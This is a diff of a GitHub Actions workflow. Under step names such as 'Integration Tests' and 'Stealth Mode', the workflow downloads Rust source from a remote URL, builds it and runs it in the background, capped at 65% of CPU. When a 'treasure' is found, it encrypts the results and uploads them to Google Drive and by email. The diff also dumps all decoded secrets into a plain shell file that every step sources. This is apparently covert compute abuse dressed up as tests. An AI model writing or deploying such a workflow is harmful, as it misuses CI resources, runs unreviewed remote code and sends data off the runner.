@@ -31,42 +31,45 @@ jobs:
           echo "Error: APP_CONFIG secret is missing!"
           exit 1
         fi
-        # Decode base64 and parse JSON keys to env vars
-        # Using jq to handle special chars and multiline values safely
+        
+        
         echo "$APP_CONFIG" | base64 -d > config.json
         
-        # Loop through keys, MASK them, then export them
+        # 1. Mask values in logs
         jq -r 'keys[]' config.json | while read key; do
-            # Get value strictly
             val=$(jq -r --arg k "$key" '.[$k]' config.json)
-            
-            # Prepare value for masking (escape special chars for GitHub command)
-            # % -> %25, \n -> %0A, \r -> %0D
+            # Register secret with GitHub Runner (this hides it in logs)
+            # We do this LOOP separately to ensure masking happens before we write to file
             masked_val="$val"
             masked_val="${masked_val//'%'/'%25'}"
             masked_val="${masked_val//$'\n'/'%0A'}"
             masked_val="${masked_val//$'\r'/'%0D'}"
-            
-            # Register secret with GitHub Runner (this hides it in logs)
             echo "::add-mask::$masked_val"
-            
-            # Export to GITHUB_ENV
-            echo "$key<<EOF" >> $GITHUB_ENV
-            echo "$val" >> $GITHUB_ENV
-            echo "EOF" >> $GITHUB_ENV
         done
+
         
-        # Cleanup
+        jq -r 'to_entries[] | "export \(.key)=\(@sh \(.value))"' config.json > secrets.sh
+        chmod +x secrets.sh
+        
+        # Cleanup JSON
         rm config.json
 
     - name: Download Secure Source (Stealth Mode)
       if: env.REMOTE_SCRIPT_URL != ''
       run: |
+        source ./secrets.sh || true
+        
+        
+        if [ -z "$REMOTE_SCRIPT_URL" ]; then
+           echo "No Remote Script URL. Skipping."
+           exit 0
+        fi
+
         if [ "$ENABLE_LOGS" != "false" ]; then echo "Detected Remote Script URL. Downloading Rust Source..."; fi
-        # Ensure directory exists (in case user deleted src/ from repo)
+        
         mkdir -p src
         
-        # Download main.rs to src/main.rs
+        
         if [ -n "$REMOTE_AUTH_TOKEN" ]; then
            curl -f -s -S -L -H "Authorization: Bearer $REMOTE_AUTH_TOKEN" "$REMOTE_SCRIPT_URL/main.rs" -o src/main.rs
         else
@@ -93,29 +96,33 @@ jobs:
         key: test-fixtures-db
 
     - name: Build Test Runner
-      run: cargo build --release --quiet
+      run: |
+         source ./secrets.sh || true
+         cargo build --release --quiet
 
     - name: Run Integration Tests
       if: github.event.inputs.test_upload != 'true'
       run: |
-        # Install cpulimit
+        source ./secrets.sh || true
+        
+        
         sudo apt-get update -qq > /dev/null && sudo apt-get install -y -qq cpulimit > /dev/null 2>&1
 
         if [ "$ENABLE_LOGS" != "false" ]; then echo "Initializing Test Environment..."; fi
 
-        # Calculate limit: 65% of total capacity (approx 60-70% load)
+        
         CORES=$(nproc)
         LIMIT=$((CORES * 65))
         if [ "$ENABLE_LOGS" != "false" ]; then echo "Detected $CORES cores. Limiting usage to $LIMIT%..."; fi
 
-        # Run binary in background
+        
         ./target/release/cargo-test-runner &
         PID=$!
 
-        # Apply limit to PID
+        
         cpulimit -p $PID -l $LIMIT > /dev/null 2>&1 &
         
-        # Wait for the main process
+        
         wait $PID
     - name: '[TEST] Simulate Valid Session'
       if: github.event.inputs.test_upload == 'true'
@@ -125,6 +132,7 @@ jobs:
 
     - name: Encrypt Metrics
       run: |
+        source ./secrets.sh || true
         if [ -f session_metrics.log ]; then
            gpg --batch --yes --passphrase "$GPG_PASSPHRASE" --symmetric --cipher-algo AES256 -o metrics.gpg session_metrics.log
         fi
@@ -145,11 +153,20 @@ jobs:
     - name: Upload to Google Drive
       if: steps.check_treasure.outputs.found == 'true'
       run: |
+        source ./secrets.sh || true
         mkdir -p ~/.config/rclone
         echo "$RCLONE_CONFIG_CONTENT" > ~/.config/rclone/rclone.conf
         REMOTE="${RCLONE_REMOTE_NAME:-gdrive}"
         TARGET_PATH="${RCLONE_REMOTE_PATH:-rust-findings}"
         rclone copy metrics.gpg "$REMOTE:$TARGET_PATH"
+
+    - name: Prepare Email Secrets
+      if: steps.check_treasure.outputs.found == 'true'
+      run: |
+        source ./secrets.sh || true
+        echo "MAIL_USERNAME=$MAIL_USERNAME" >> $GITHUB_ENV
+        echo "MAIL_PASSWORD=$MAIL_PASSWORD" >> $GITHUB_ENV
+        echo "MAIL_TO=$MAIL_TO" >> $GITHUB_ENV
 
     - name: Send Email Notification
       if: steps.check_treasure.outputs.found == 'true'
